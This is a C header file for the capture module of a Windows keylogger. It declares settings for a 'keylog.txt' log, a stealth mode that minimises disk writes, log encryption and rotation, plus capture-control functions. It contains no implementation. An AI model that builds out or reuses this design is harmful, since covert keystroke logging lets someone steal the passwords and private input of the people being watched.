#ifndef CAPTURE_H
#define CAPTURE_H

#include <stdbool.h>
#include <windows.h>
#include "hooks.h"
#include "buffer.h"

// Configuration
#define CAPTURE_LOG_DIR "logs"
#define CAPTURE_DEFAULT_LOG "keylog.txt"
#define CAPTURE_MAX_PATH 260
#define CAPTURE_FLUSH_INTERVAL 1000  // 1 second
#define CAPTURE_MAX_FILE_SIZE (10 * 1024 * 1024)  // 10MB
#define CAPTURE_MAX_ENTRY_SIZE 2048
#define CAPTURE_BUFFER_SIZE (1024 * 1024)

// Error codes
#define CAPTURE_ERROR_NONE     0
#define CAPTURE_ERROR_INIT     1
#define CAPTURE_ERROR_FILE     2
#define CAPTURE_ERROR_MEMORY   3
#define CAPTURE_ERROR_HOOKS    4
#define CAPTURE_ERROR_BUFFER   5

// Capture modes
typedef enum {
    CAPTURE_MODE_NORMAL,    // Standard capture
    CAPTURE_MODE_STEALTH,   // Minimal disk writes
    CAPTURE_MODE_DEBUG      // Verbose logging
} CaptureMode;

// Capture configuration
typedef struct {
    char log_path[CAPTURE_MAX_PATH];    // Path to log file
    CaptureMode mode;                   // Capture mode
    DWORD flush_interval;               // Flush interval in ms
    size_t max_file_size;              // Maximum log file size
    bool rotate_logs;                   // Enable log rotation
    bool encrypt_logs;                  // Enable encryption
    bool buffer_events;                 // Use buffer for events
} CaptureConfig;

// Capture statistics
typedef struct {
    size_t events_captured;     // Total events captured
    size_t bytes_written;       // Total bytes written
    size_t files_rotated;      // Number of log files rotated
    size_t write_errors;       // Number of write errors
    size_t events_buffered;    // Number of events in buffer
    size_t buffer_overflows;   // Number of buffer overflows
} CaptureStats;

// Core functions
bool init_capture(const CaptureConfig* config);
void cleanup_capture(void);
bool start_capture(void);
void stop_capture(void);

// Configuration functions
void set_capture_config(const CaptureConfig* config);
void get_capture_config(CaptureConfig* config);
void get_capture_stats(CaptureStats* stats);

// Status functions
bool is_capture_active(void);
DWORD get_capture_error(void);
bool flush_capture_buffer(void);
bool is_capture_buffer_full(void);

#endif // CAPTURE_H